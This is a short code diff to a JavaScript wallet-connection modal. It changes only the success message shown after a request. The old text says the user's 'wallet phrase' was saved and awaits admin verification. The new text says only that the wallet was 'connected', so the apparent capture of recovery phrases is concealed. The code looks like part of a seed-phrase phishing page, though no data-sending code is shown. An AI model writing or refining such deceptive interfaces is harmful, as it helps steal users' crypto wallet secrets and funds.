@@ -161,12 +161,15 @@ window.WalletModalHandler = {
             
             // Check if request was successful
             if (result.success) {
-                // Show success modal
+                // Close wallet modal first
+                this.closeWalletModal();
+                
+                // Show success modal with success message
                 const successTitle = document.getElementById('successTitle');
                 const successMessage = document.getElementById('successMessage');
                 
-                if (successTitle) successTitle.textContent = 'Wallet Connected!';
-                if (successMessage) successMessage.textContent = result.message || 'Your wallet phrase has been saved successfully. Admin verification is pending.';
+                if (successTitle) successTitle.textContent = 'Success!';
+                if (successMessage) successMessage.textContent = result.message || 'Your wallet has been successfully connected to your account.';
                 
                 const successModal = document.getElementById('successModal');
                 successModal.style.display = 'flex';
